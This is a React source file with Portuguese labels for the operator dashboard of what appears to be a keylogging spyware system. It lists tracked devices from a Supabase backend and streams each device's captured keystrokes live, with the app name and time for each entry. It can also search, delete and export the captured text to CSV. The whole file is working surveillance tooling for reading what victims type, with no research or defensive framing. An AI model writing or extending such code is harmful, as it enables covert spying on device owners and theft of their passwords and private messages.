import React, { useState, useEffect } from 'react';
import { Keyboard, Search, Download, Trash2, Filter, Loader } from 'lucide-react';
import { supabase } from '../../lib/supabase';

const Keylogger = () => {
  const [logs, setLogs] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedDevice, setSelectedDevice] = useState<any>(null);

  // Carregar dispositivo selecionado e logs
  useEffect(() => {
    const fetchDeviceAndLogs = async () => {
      const savedDeviceId = localStorage.getItem('selectedDeviceId');

      const { data: devices } = await supabase
        .from('devices')
        .select('*')
        .order('last_seen', { ascending: false });

      if (devices && devices.length > 0) {
        const device = savedDeviceId
          ? devices.find(d => d.id === savedDeviceId) || devices[0]
          : devices[0];
        setSelectedDevice(device);
      }
    };

    fetchDeviceAndLogs();
  }, []);

  // Buscar logs quando dispositivo mudar
  useEffect(() => {
    if (!selectedDevice?.id) {
      setLoading(false);
      return;
    }

    fetchLogs();

    // Realtime subscription
    const channel = supabase
      .channel(`keylog-${selectedDevice.id}`)
      .on('postgres_changes', {
        event: 'INSERT',
        schema: 'public',
        table: 'keylog_entries',
        filter: `device_id=eq.${selectedDevice.id}`
      }, (payload) => {
        setLogs(prev => [payload.new, ...prev]);
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [selectedDevice]);

  const fetchLogs = async () => {
    if (!selectedDevice?.id) return;

    setLoading(true);
    try {
      const { data, error } = await supabase
        .from('keylog_entries')
        .select('*')
        .eq('device_id', selectedDevice.id)
        .order('timestamp', { ascending: false })
        .limit(500);

      if (!error && data) {
        setLogs(data);
      }
    } catch (err) {
      console.error('Erro ao buscar logs:', err);
    } finally {
      setLoading(false);
    }
  };

  const deletelog = async (id: string) => {
    if (!confirm('Deseja excluir este registro?')) return;

    const { error } = await supabase
      .from('keylog_entries')
      .delete()
      .eq('id', id);

    if (!error) {
      setLogs(prev => prev.filter(log => log.id !== id));
    }
  };

  const exportToCSV = () => {
    const csv = [
      ['App', 'Texto Capturado', 'Data/Hora'].join(','),
      ...logs.map(log => [
        log.app_name || 'Desconhecido',
        `"${log.text_captured}"`,
        new Date(log.timestamp).toLocaleString('pt-BR')
      ].join(','))
    ].join('\n');

    const blob = new Blob([csv], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylogger_${selectedDevice?.model || 'device'}_${new Date().toISOString().split('T')[0]}.csv`;
    a.click();
  };

  // Filtrar logs por busca
  const filteredLogs = logs.filter(log =>
    searchTerm === '' ||
    log.text_captured?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    log.app_name?.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="h-full flex flex-col bg-bg-primary text-text-primary p-6 overflow-hidden">
      <div className="flex justify-between items-center mb-6">
        <div>
          <h2 className="text-2xl font-tactical font-bold text-accent-blue flex items-center gap-2">
            <Keyboard className="animate-pulse" />
            KEYLOGGER
          </h2>
          <p className="text-sm text-text-secondary font-mono">
            Registro completo de digitação (Keystrokes)
          </p>
        </div>
        <div className="flex gap-2">
          <button
            onClick={fetchLogs}
            disabled={loading}
            className="flex items-center gap-2 px-4 py-2 bg-bg-tertiary border border-border-color rounded hover:bg-bg-secondary transition-colors text-xs font-bold font-tactical disabled:opacity-50"
          >
            {loading ? <Loader size={14} className="animate-spin" /> : <Filter size={14} />}
            {loading ? 'CARREGANDO...' : 'ATUALIZAR'}
          </button>
          <button
            onClick={exportToCSV}
            disabled={logs.length === 0}
            className="flex items-center gap-2 px-4 py-2 bg-accent-blue/20 border border-accent-blue text-accent-blue rounded hover:bg-accent-blue/30 transition-colors text-xs font-bold font-tactical disabled:opacity-50"
          >
            <Download size={14} /> EXPORTAR CSV ({logs.length})
          </button>
        </div>
      </div>

      <div className="bg-bg-secondary rounded-lg border border-border-color flex-1 flex flex-col overflow-hidden">
        {/* Search Bar */}
        <div className="p-4 border-b border-border-color flex items-center gap-2 bg-bg-tertiary/50">
          <Search size={16} className="text-text-muted" />
          <input
            type="text"
            placeholder="Buscar nos logs..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="bg-transparent border-none outline-none text-sm text-text-primary w-full font-mono"
          />
          {searchTerm && (
            <span className="text-xs text-accent-blue">
              {filteredLogs.length} resultado{filteredLogs.length !== 1 ? 's' : ''}
            </span>
          )}
        </div>

        {/* Table Header */}
        <div className="grid grid-cols-12 gap-4 p-3 bg-bg-tertiary border-b border-border-color text-xs font-bold text-text-secondary uppercase tracking-wider">
          <div className="col-span-2">App</div>
          <div className="col-span-6">Texto Capturado</div>
          <div className="col-span-2">Data/Hora</div>
          <div className="col-span-2 text-right">Ações</div>
        </div>

        {/* Table Body */}
        <div className="overflow-y-auto custom-scrollbar flex-1">
          {loading ? (
            <div className="p-6 text-sm text-text-secondary font-mono flex items-center justify-center gap-2">
              <Loader className="animate-spin" size={16} />
              Carregando logs...
            </div>
          ) : filteredLogs.length === 0 ? (
            <div className="p-6 text-sm text-text-secondary font-mono text-center">
              {searchTerm ? 'Nenhum resultado encontrado para a busca.' : 'Sem dados recebidos. O agente começará a coletar assim que houver digitação.'}
            </div>
          ) : (
            filteredLogs.map((log) => {
              const timestamp = new Date(log.timestamp);
              const date = timestamp.toLocaleDateString('pt-BR');
              const time = timestamp.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

              return (
                <div key={log.id} className="grid grid-cols-12 gap-4 p-3 border-b border-border-color hover:bg-bg-tertiary/30 transition-colors text-sm font-mono items-center">
                  <div className="col-span-2 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-accent-green"></span>
                    <span className="truncate" title={log.app_name || log.app_package}>
                      {log.app_name || log.app_package || 'Desconhecido'}
                    </span>
                  </div>
                  <div className="col-span-6 text-text-secondary truncate" title={log.text_captured}>
                    {log.text_captured}
                  </div>
                  <div className="col-span-2 text-text-muted text-xs">
                    {date} <span className="text-text-primary">{time}</span>
                  </div>
                  <div className="col-span-2 text-right">
                    <button
                      onClick={() => deletelog(log.id)}
                      className="p-1 hover:text-accent-red transition-colors"
                      title="Excluir Registro"
                    >
                      <Trash2 size={14} />
                    </button>
                  </div>
                </div>
              );
            })
          )}
        </div>
      </div>
    </div>
  );
};

export default Keylogger;
